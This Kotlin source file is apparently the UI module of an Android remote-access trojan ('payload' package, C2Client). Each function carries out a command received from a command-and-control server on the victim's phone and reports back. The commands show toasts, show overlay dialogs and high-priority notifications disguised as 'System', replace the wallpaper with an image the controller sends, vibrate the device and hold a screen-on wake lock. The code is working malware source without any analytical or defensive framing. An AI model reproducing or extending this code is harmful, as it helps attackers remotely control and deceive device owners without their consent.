package com.ihk909.payload.modules

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.WallpaperManager
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.util.Base64
import android.widget.Toast
import com.ihk909.payload.C2Client
import com.ihk909.payload.OverlayDialogActivity
import org.json.JSONObject
import java.io.ByteArrayInputStream

object UiModule {
    private val ui = Handler(Looper.getMainLooper())
    private var wake: PowerManager.WakeLock? = null

    fun toast(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        val msg = args.optString("msg", "")
        ui.post { Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show() }
        c2.reply(id, JSONObject().put("ok", true))
    }

    fun dialog(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        val i = Intent(ctx, OverlayDialogActivity::class.java)
            .putExtra("title", args.optString("title", "System"))
            .putExtra("msg", args.optString("msg", ""))
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        ctx.startActivity(i)
        c2.reply(id, JSONObject().put("ok", true))
    }

    fun notification(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_HIGH))
            }
            val n = Notification.Builder(ctx, "sys")
                .setContentTitle(args.optString("title", "System"))
                .setContentText(args.optString("msg", ""))
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .build()
            nm.notify((System.currentTimeMillis() % 100000).toInt(), n)
            c2.reply(id, JSONObject().put("ok", true))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun wallpaper(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        Thread {
            runCatching {
                val bytes = Base64.decode(args.getString("b64"), Base64.NO_WRAP)
                val bmp = BitmapFactory.decodeStream(ByteArrayInputStream(bytes))
                WallpaperManager.getInstance(ctx).setBitmap(bmp)
                c2.reply(id, JSONObject().put("ok", true))
            }.onFailure { c2.replyError(id, it.message ?: "error") }
        }.start()
    }

    fun vibrate(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val ms = args.optLong("ms", 1500)
            val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(ms)
            }
            c2.reply(id, JSONObject().put("ok", true))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun wakeLock(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val on = args.optBoolean("on", true)
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (on) {
                if (wake == null) {
                    wake = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "ihk909:wake"
                    )
                }
                if (wake?.isHeld == false) wake?.acquire()
            } else if (wake?.isHeld == true) {
                wake?.release()
            }
            c2.reply(id, JSONObject().put("on", on))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}